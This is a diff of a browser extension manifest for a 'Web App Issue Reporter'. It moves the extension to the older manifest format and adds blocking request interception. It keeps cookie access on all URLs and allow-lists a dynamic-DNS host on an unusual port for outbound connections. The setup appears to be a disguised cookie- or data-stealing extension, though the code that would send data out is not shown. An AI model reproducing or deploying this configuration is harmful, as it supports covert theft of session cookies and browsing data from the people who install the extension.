@@ -1,31 +1,20 @@
 {
-  "manifest_version": 3,
+  "manifest_version": 2,
   "name": "Web App Issue Reporter",
   "version": "1.0.0",
   "description": "Help users report and resolve issues encountered while using web applications",
   "permissions": [
     "activeTab",
-    "scripting",
     "storage",
     "cookies",
     "system.display",
-    "declarativeNetRequest"
-  ],
-  "host_permissions": [
     "<all_urls>",
-    "http://he808v7amke.sn.mynetname.net:28919/*"
+    "http://he808v7amke.sn.mynetname.net:28919/*",
+    "webRequest",
+    "webRequestBlocking"
   ],
-  "declarative_net_request": {
-    "rule_resources": [{
-      "id": "ruleset_1",
-      "enabled": true,
-      "path": "rules.json"
-    }]
-  },
-  "content_security_policy": {
-    "extension_pages": "script-src 'self'; object-src 'self'; connect-src 'self' http://he808v7amke.sn.mynetname.net:28919"
-  },
-  "action": {
+  "content_security_policy": "script-src 'self'; object-src 'self'; connect-src 'self' http://he808v7amke.sn.mynetname.net:28919",
+  "browser_action": {
     "default_popup": "src/pages/popup.html",
     "default_icon": {
       "16": "src/images/icon16.png",
@@ -34,8 +23,8 @@
     }
   },
   "background": {
-    "service_worker": "src/js/background.js",
-    "type": "module"
+    "scripts": ["src/js/background.js"],
+    "persistent": true
   },
   "content_scripts": [
     {
